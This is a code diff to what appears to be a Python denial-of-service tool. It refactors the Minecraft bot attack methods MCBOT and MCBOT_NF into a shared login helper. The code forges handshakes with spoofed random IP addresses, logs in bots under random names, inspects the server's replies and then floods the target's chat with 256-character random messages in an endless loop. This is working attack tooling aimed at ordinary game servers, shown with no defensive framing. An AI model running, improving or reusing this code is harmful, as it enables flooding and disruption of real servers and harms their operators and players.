@@ -592,19 +592,58 @@ class Layer4(Thread):
                 continue
         Tools.safe_close(s)
 
-    def MCBOT(self) -> None:
-        s = None
-
-        with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:
-            bot_uuid = uuid4()
+    def _mc_login(self, s, forwarded=True):
+        bot_uuid = uuid4()
+        fake_ip = ProxyTools.Random.rand_ipv4()
+        if forwarded:
             Tools.send(s, Minecraft.handshake_forwarded(self._target,
-                                                        self.protocolid,
-                                                        2,
-                                                        ProxyTools.Random.rand_ipv4(),
-                                                        bot_uuid))
+                                                       self.protocolid,
+                                                       2, fake_ip, bot_uuid))
+            logger.debug(f"[MCBOT] Sent forwarded handshake (ip={fake_ip}, uuid={bot_uuid})")
+        else:
+            Tools.send(s, Minecraft.handshake(self._target, self.protocolid, 2))
+            logger.debug(f"[MCBOT] Sent normal handshake")
+
+        username = f"{con['MCBOT']}{ProxyTools.Random.rand_str(5)}"
+        password = b64encode(username.encode()).decode()[:8].title()
+        Tools.send(s, Minecraft.login(self.protocolid, username, bot_uuid))
+        logger.debug(f"[MCBOT] Sent login (user={username})")
+
+        s.settimeout(3)
+        try:
+            data = s.recv(4096)
+            if data:
+                pid = data[0] if data else -1
+                logger.debug(f"[MCBOT] Server response packet ID: {pid}, size: {len(data)}")
+                if pid == 0x00:
+                    logger.debug(f"[MCBOT] Got Login Success (0x00)")
+                elif pid == 0x17:
+                    logger.debug(f"[MCBOT] Got Login Plugin Request (velocity:player_info)")
+                elif pid == 0x1A or pid == 0x0A:
+                    try:
+                        reason = data[1:]
+                        logger.debug(f"[MCBOT] Disconnected: {reason[:100]}")
+                    except:
+                        pass
+                    return False
+                else:
+                    logger.debug(f"[MCBOT] Unknown packet ID: {pid}, raw: {data[:50].hex()}")
+            else:
+                logger.debug(f"[MCBOT] Server sent empty response")
+                return False
+        except socket.timeout:
+            logger.debug(f"[MCBOT] No response from server (timeout)")
+        except Exception as e:
+            logger.debug(f"[MCBOT] Error reading response: {e}")
+
+        return True
+
+    def MCBOT(self) -> None:
+        with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:
+            if not self._mc_login(s, forwarded=True):
+                return
             username = f"{con['MCBOT']}{ProxyTools.Random.rand_str(5)}"
             password = b64encode(username.encode()).decode()[:8].title()
-            Tools.send(s, Minecraft.login(self.protocolid, username, bot_uuid))
 
             sleep(1.5)
 
@@ -615,14 +654,11 @@ class Layer4(Thread):
                 sleep(1.1)
 
     def MCBOT_NF(self) -> None:
-        s = None
-
         with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:
-            bot_uuid = uuid4()
-            Tools.send(s, Minecraft.handshake(self._target, self.protocolid, 2))
+            if not self._mc_login(s, forwarded=False):
+                return
             username = f"{con['MCBOT']}{ProxyTools.Random.rand_str(5)}"
             password = b64encode(username.encode()).decode()[:8].title()
-            Tools.send(s, Minecraft.login(self.protocolid, username, bot_uuid))
 
             sleep(1.5)
 
@@ -631,8 +667,6 @@ class Layer4(Thread):
 
             while Tools.send(s, Minecraft.chat(self.protocolid, str(ProxyTools.Random.rand_str(256)))):
                 sleep(1.1)
-
-        Tools.safe_close(s)
 
     def VSE(self) -> None:
         global BYTES_SEND, REQUESTS_SENT
